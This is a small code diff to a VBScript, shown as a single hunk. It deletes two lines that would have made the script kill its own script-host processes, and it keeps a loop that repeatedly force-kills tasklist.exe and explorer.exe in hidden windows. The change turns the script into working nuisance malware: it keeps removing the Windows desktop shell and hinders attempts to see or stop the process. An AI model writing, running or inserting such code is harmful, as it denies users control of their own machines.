@@ -1,6 +1,4 @@
 Set ySh = WScript.CreateObject("WScript.Shell")
-ySh.run "taskkill /f /im wscript.exe", 0, True
-ySh.run "taskkill /f /im cscript.exe", 0, True
 Do
 ySh.run "taskkill /f /im tasklist.exe", 0, True
 ySh.run "taskkill /f /im explorer.exe", 0, True
